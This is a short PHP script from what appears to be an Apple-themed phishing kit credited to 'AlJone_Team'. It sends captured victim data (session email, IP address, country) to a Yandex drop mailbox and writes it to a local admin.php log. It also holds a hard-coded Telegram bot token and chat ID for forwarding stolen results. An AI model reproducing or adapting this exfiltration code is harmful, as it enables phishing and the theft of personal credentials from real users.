<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Apple -
 * version 01
 * icq & telegram = @AlJone27
 
###############################################
#$            C0d3d by AlJone_Team           $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2021 Apple             $#
###############################################

**/

$yourmail  = 'rezultppl@yandex.com';

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['Emailapp']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Apple" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

$botToken="1662260368:AAGVl-My3OI7_7-tVWfSsu966KaF8XpxcBw";
$chatId="1260844600";  
